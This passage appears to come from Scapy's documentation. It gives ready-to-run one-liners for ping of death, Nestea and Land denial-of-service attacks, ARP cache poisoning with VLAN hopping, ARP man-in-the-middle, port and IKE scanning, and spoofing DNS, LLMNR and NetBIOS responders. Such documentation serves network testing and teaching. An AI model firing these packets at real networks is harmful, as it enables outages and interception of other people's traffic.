-----------------

Malformed packets::

    >>> send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP()) 

Ping of death (Muuahahah)::

    >>> send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) ) 

Nestea attack::

    >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10)) 
    >>> send(IP(dst=target, id=42, frag=48)/("X"*116)) 
    >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224)) 
    
Land attack (designed for Microsoft Windows)::

    >>> send(IP(src=target,dst=target)/TCP(sport=135,dport=135))

ARP cache poisoning   
------------------- 
This attack prevents a client from joining the gateway by poisoning 
its ARP cache through a VLAN hopping attack. 

Classic ARP cache poisoning::

    >>> send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client), 
          inter=RandNum(10,40), loop=1 ) 

ARP cache poisoning with double 802.1q encapsulation::
 
    >>> send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) 
          /ARP(op="who-has", psrc=gateway, pdst=client),
          inter=RandNum(10,40), loop=1 )

ARP MitM
--------
This poisons the cache of 2 machines, then answers all following ARP requests to put the host between.
Calling ctrl^C will restore the connection.

::

    $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
    $ sysctl net.ipv4.ip_forward=1
    $ sudo scapy
    >>> arp_mitm("192.168.122.156", "192.168.122.17")

TCP Port Scanning 
-----------------
 
Send a TCP SYN on each port. Wait for a SYN-ACK or a RST or an ICMP error:: 

    >>> res, unans = sr( IP(dst="target") 
                    /TCP(flags="S", dport=(1,1024)) ) 

Possible result visualization: open ports

::

    >>> res.nsummary( lfilter=lambda s,r: (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
    
    
IKE Scanning
------------

We try to identify VPN concentrators by sending ISAKMP Security Association proposals
and receiving the answers::

    >>> res, unans = sr( IP(dst="192.168.1.0/24")/UDP()
                    /ISAKMP(init_cookie=RandString(8), exch_type="identity prot.") 
                    /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()) 
                  ) 

Visualizing the results in a list::

    >>> res.nsummary(prn=lambda s,r: r.src, lfilter=lambda s,r: r.haslayer(ISAKMP) ) 


DNS server
----------

By default, ``dnsd`` uses a joker (IPv4 only): it answers to all unknown servers with the joker. See :class:`~scapy.layers.dns.DNS_am`::

    >>> dnsd(iface="tap0", match={"google.com": "1.1.1.1"}, joker="192.168.1.1")

You can also use ``relay=True`` to replace the joker behavior with a forward to a server included in ``conf.nameservers``.

mDNS server
------------

See :class:`~scapy.layers.dns.mDNS_am`::

    >>> mdnsd(iface="eth0", joker="192.168.1.1")

Note that ``mdnsd`` extends the ``dnsd`` API.

LLMNR server
------------

See :class:`~scapy.layers.llmnr.LLMNR_am`::

    >>> conf.iface = "tap0"
    >>> llmnrd(iface="tap0", from_ip=Net("10.0.0.1/24"))

Note that ``llmnrd`` extends the ``dnsd`` API.

Netbios server
--------------

See :class:`~scapy.layers.netbios.NBNS_am`::

    >>> nbnsd(iface="eth0")  # With local IP
    >>> nbnsd(iface="eth0", ip="192.168.122.17")  # With some other IP

Node status request (get NetbiosName from IP)
---------------------------------------------

.. code::

    >>> sr1(IP(dst="192.168.122.17")/UDP()/NBNSHeader()/NBNSNodeStatusRequest())

NBNS Query Request (find by NetbiosName)
----------------------------------------

.. code::

    >>> conf.checkIPaddr = False  # Mandatory because we are using a broadcast destination and receiving unicast
    >>> sr1(IP(dst="192.168.0.255")/UDP()/NBNSHeader()/NBNSQueryRequest(QUESTION_NAME="DC1"))

mDNS Query Request
------------------

For instance, find all spotify connect devices.

.. code::

    >>> # For interface 'eth0'
    >>> ans, _ = sr(IPv6(dst="ff02::fb%eth0")/UDP(sport=5353, dport=5353)/DNS(rd=0, qd=[DNSQR(qname='_spotify-connect._tcp.local', qtype="PTR")]), multi=True, timeout=2)
    >>> ans.show()

.. note::

    As you can see, we used a scope identifier (``%eth0``) to specify on which interface we want to use the above multicast IP.

Advanced traceroute
-------------------

TCP SYN traceroute
^^^^^^^^^^^^^^^^^^

::

    >>> ans, unans = sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))

Results would be::

    >>> ans.summary( lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
    192.168.1.1     time-exceeded
    68.86.90.162    time-exceeded
    4.79.43.134     time-exceeded
    4.79.43.133     time-exceeded
    4.68.18.126     time-exceeded
    4.68.123.38     time-exceeded
    4.2.2.1         SA
